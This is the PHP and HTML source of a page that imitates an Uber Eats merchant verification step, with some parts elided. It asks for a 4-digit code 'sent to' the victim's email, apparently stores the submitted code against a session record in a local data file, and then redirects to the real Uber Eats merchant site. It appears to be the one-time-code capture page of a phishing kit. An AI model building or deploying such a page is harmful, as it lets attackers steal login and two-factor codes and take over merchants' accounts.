...
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['otp'])) {
    $otp = $_POST['otp'];
    $recordId = isset($_SESSION['record_id']) ? $_SESSION['record_id'] : null;
    
    if ($recordId && file_exists($dataFile)) {
    ...
    session_destroy();
    header('Location: https://merchants.ubereats.com/manager/home/');
    exit;
}

// Get email from session
$userEmail = isset($_SESSION['user_email']) ? $_SESSION['user_email'] : 'your email';
?>
<!DOCTYPE html>
            ...
            <div class="flex h-full flex-col pt-[16px] box-border justify-between [-webkit-box-pack:justify] [-webkit-box-orient:vertical] [-webkit-box-direction:normal] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]">
              <div class="flex grow flex-col box-border [-webkit-box-flex:1] [-webkit-box-orient:vertical] [-webkit-box-direction:normal] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]">
                ...
                <h1 id="title" class="m-0 box-border font-normal leading-[30px] [font-size:24px] text-[oklch(0%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]">
                  Enter the 4-digit code sent to you at: <?php echo htmlspecialchars($userEmail); ?>
                </h1>
                <div class="h-[32px] box-border"></div>
                ...
                <form id="otp-form" method="POST" action="otp-verification.php">
                  <input type="hidden" id="otp-value" name="otp" />
                  
                  <div class="flex gap-[12px] justify-start mb-[16px]">
                    <div class="flex pr-[12px] w-[56px] h-[56px] flex-row pl-[12px] py-[10px] box-border rounded-[8px] justify-center items-center [-webkit-box-direction:normal] [-webkit-box-orient:horizontal] [background:oklch(96.415%0_none)] [border:2px_solid_oklch(0%0_none/0)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus-within:[background:oklch(97.315%0_none)] focus-within:[border:2px_solid_oklch(0%0_none)]">
                      <input id="otp1" type="text" inputmode="numeric" maxlength="1" class="m-0 p-0 w-full text-center box-border [border:none] leading-[24px] [outline:none] [font-size:20px] font-medium [background:oklch(96.415%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus:[background:oklch(97.315%0_none)]" oninput="moveToNext(this, 'otp2')" onkeydown="handleKeyDown(event, this, null)" autofocus required />
                    </div>
                    <div class="flex pr-[12px] w-[56px] h-[56px] flex-row pl-[12px] py-[10px] box-border rounded-[8px] justify-center items-center [-webkit-box-direction:normal] [-webkit-box-orient:horizontal] [background:oklch(96.415%0_none)] [border:2px_solid_oklch(0%0_none/0)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus-within:[background:oklch(97.315%0_none)] focus-within:[border:2px_solid_oklch(0%0_none)]">
                      <input id="otp2" type="text" inputmode="numeric" maxlength="1" class="m-0 p-0 w-full text-center box-border [border:none] leading-[24px] [outline:none] [font-size:20px] font-medium [background:oklch(96.415%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus:[background:oklch(97.315%0_none)]" oninput="moveToNext(this, 'otp3')" onkeydown="handleKeyDown(event, this, 'otp1')" required />
                    </div>
                    <div class="flex pr-[12px] w-[56px] h-[56px] flex-row pl-[12px] py-[10px] box-border rounded-[8px] justify-center items-center [-webkit-box-direction:normal] [-webkit-box-orient:horizontal] [background:oklch(96.415%0_none)] [border:2px_solid_oklch(0%0_none/0)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus-within:[background:oklch(97.315%0_none)] focus-within:[border:2px_solid_oklch(0%0_none)]">
                      <input id="otp3" type="text" inputmode="numeric" maxlength="1" class="m-0 p-0 w-full text-center box-border [border:none] leading-[24px] [outline:none] [font-size:20px] font-medium [background:oklch(96.415%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus:[background:oklch(97.315%0_none)]" oninput="moveToNext(this, 'otp4')" onkeydown="handleKeyDown(event, this, 'otp2')" required />
                    </div>
                    <div class="flex pr-[12px] w-[56px] h-[56px] flex-row pl-[12px] py-[10px] box-border rounded-[8px] justify-center items-center [-webkit-box-direction:normal] [-webkit-box-orient:horizontal] [background:oklch(96.415%0_none)] [border:2px_solid_oklch(0%0_none/0)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus-within:[background:oklch(97.315%0_none)] focus-within:[border:2px_solid_oklch(0%0_none)]">
                      <input id="otp4" type="text" inputmode="numeric" maxlength="1" class="m-0 p-0 w-full text-center box-border [border:none] leading-[24px] [outline:none] [font-size:20px] font-medium [background:oklch(96.415%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus:[background:oklch(97.315%0_none)]" oninput="moveToNext(this, null)" onkeydown="handleKeyDown(event, this, 'otp3')" required />
                    </div>
                  </div>
                  
                  <p class="m-0 mb-[16px] text-[14px] leading-[20px] text-[oklch(48.193%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol]">
                    Tip: Make sure to check your inbox and spam folders
                  </p>
                  
                  <button type="button" onclick="resendCode()" class="mb-[24px] p-0 text-[16px] leading-[24px] font-medium text-[oklch(0%0_none)] bg-transparent border-none cursor-pointer underline [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] hover:text-[oklch(27.685%0_none)]">
                    Resend
                  </button>
                  
                  <div class="h-[16px] box-border"></div>
                  
                  <div class="flex items-center justify-between gap-[16px]">
                    <button type="button" onclick="goBack()" class="m-0 flex px-[16px] py-[14px] box-border shadow-none font-medium ease-linear items-center min-h-[48px] rounded-[8px] [border:none] cursor-pointer leading-[20px] [outline:none] duration-[0.2s] [font-size:16px] text-[oklch(0%0_none)] transition-[background] [-webkit-box-align:center] [background:oklch(93.1%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus-visible:shadow-[inset_0_0_0_3px_oklch(57.3%0.20954_261.36)] hover:[background:oklch(89.755%0_none)] active:[background:oklch(79.207%0_none)]">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M15 18L9 12L15 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                      </svg>
                    </button>
                    
                    <button id="next-btn" type="button" onclick="submitOTP()" disabled class="m-0 flex flex-1 px-[16px] py-[14px] box-border shadow-none font-medium ease-linear items-center min-h-[48px] rounded-[8px] [border:none] cursor-pointer leading-[20px] [outline:none] duration-[0.2s] [font-size:16px] transition-[background] text-[oklch(100%0_none)] [-webkit-box-align:center] [background:oklch(0%0_none)] [font-family:-apple-system,BlinkMacSystemFont,SegoeUI,Roboto,Helvetica,Arial,sans-serif,AppleColorEmoji,SegoeUIEmoji,SegoeUISymbol] focus-visible:shadow-[inset_0_0_0_3px_oklch(57.3%0.20954_261.36)] disabled:cursor-not-allowed disabled:text-[oklch(72.516%0_none)] disabled:[background:oklch(96.415%0_none)] hover:[background:oklch(27.685%0_none)] active:[background:oklch(41.283%0_none)]">
                      <div class="flex w-full box-border items-center justify-between [-webkit-box-pack:justify] [-webkit-box-align:center]">
                        <div class="flex box-border items-center [-webkit-box-align:center]"></div>
                        <div class="flex box-border items-center [-webkit-box-align:center]">Next</div>
                        <div class="flex box-border items-center [-webkit-box-align:center]">
                          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
